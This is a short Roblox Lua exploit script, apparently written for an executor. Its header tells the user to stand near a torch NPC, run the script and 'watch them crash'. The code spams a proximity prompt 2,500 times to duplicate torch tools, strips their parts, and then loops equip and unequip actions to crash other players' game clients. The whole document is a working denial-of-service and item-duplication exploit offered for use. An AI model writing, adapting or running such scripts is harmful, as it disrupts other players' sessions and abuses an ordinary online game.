-- INSTRUCTION: 1. go near torch npc 2. execute script 3. wait 4. watch them crash


local amount = 2500 -- how much u wanna dupe (higher the better but you will also crash, lower the better you wont crash, but the others might just not crash)
local x = 0
local lp = game.Players.LocalPlayer
local crasher = true -- enable crasher

if crasher == true then
while x < amount do
    fireproximityprompt(workspace.allthings.Character[" "].Part.ProximityPrompt)
    x = x + 1
    task.wait(1/100)
 end
 end

task.wait(1)
 
for i,v in pairs(game.Players.LocalPlayer:FindFirstChildOfClass("Backpack"):GetChildren()) do
         if v:IsA("Tool") and v.Name == "Torch" then
            v.Fuel:Destroy()
            v.Effects:Destroy()
            v.Part:Destroy()
            v.Part:Destroy()
            v.Handle:Destroy()
         end
end

while crasher == true  do
    for i,v in pairs(lp:FindFirstChildOfClass("Backpack"):GetChildren()) do
            if v:IsA("Tool") and v.Name == "Torch" then
                v.Parent = lp.Character
            end
        end
        task.wait(1.1)
        lp.Character:FindFirstChildOfClass('Humanoid'):UnequipTools()
        task.wait(1.1)
end